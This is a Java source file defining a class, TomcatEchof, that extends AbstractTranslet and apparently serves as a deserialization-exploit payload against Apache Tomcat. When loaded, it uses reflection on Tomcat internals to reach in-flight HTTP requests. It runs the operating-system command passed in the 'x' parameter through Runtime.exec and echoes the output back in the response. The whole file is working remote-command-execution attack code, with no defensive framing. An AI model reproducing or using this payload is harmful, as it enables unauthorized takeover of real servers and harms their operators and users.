import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

public class TomcatEchof extends AbstractTranslet {
    public TomcatEchof() {
        try{
            // WebappClassLoaderBase--->ApplicationContext(getResources().getContext())
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            // StandardService--->Connector(Connector#getProtocolHandler)--->ProtocolHandler(AbstractProtocol#getHandler)
            ApplicationContext applicationContext = (ApplicationContext) getFieldObj(standardContext, "context");
            StandardService standardService = (StandardService) getFieldObj(applicationContext, "service");
            Connector[] connector = (Connector[]) getFieldObj(standardService, "connectors");
//            ProtocolHandler protocolHandler = (ProtocolHandler) getFieldObj(connector, "protocolHandler");
            Class<?>[] abstractProtocolList = AbstractProtocol.class.getDeclaredClasses();

            // AbstractProtocol$ConnectoinHandler--->RequestGroupInfo(global)
            for (Class<?> clazz : abstractProtocolList){
                if(clazz.getName().contains("ConnectionHandler")){
                // Popular in network: Check length
//                if (52 == (clazz.getName().length()) || 60 == (clazz.getName().length())) {
                    Method getHandlerM = AbstractProtocol.class.getDeclaredMethod("getHandler");
                    getHandlerM.setAccessible(true);
                    Field globalfield = clazz.getDeclaredField("global");
                    globalfield.setAccessible(true);
                    RequestGroupInfo requestInfos = (RequestGroupInfo) globalfield.get(getHandlerM.invoke(connector[0].getProtocolHandler()));
                    List<RequestInfo> requestInfoList = (List<RequestInfo>) getFieldObj(requestInfos, "processors");
                    // RequestInfo--->Request--->Response
                    for (RequestInfo requestInfo : requestInfoList){
                        Request req1 = (Request) getFieldObj(requestInfo, "req");
                        org.apache.catalina.connector.Request req2 = (org.apache.catalina.connector.Request) req1.getNote(1);
                        org.apache.catalina.connector.Response resp = req2.getResponse();
                        String param = req2.getParameter("x");
                        String str = execX(param);
                        resp.getWriter().println(str);
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static Object getFieldObj(Object obj, String attr) {
        try{
            Field f = obj.getClass().getDeclaredField(attr);
            f.setAccessible(true);
            return f.get(obj);
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public static String execX(String cmd) {
        try{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while ((line = reader.readLine()) != null){
                str += line;
            }
            return str;
        }catch (Exception e){
            e.printStackTrace();
        }
        return "?x=whoami";
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
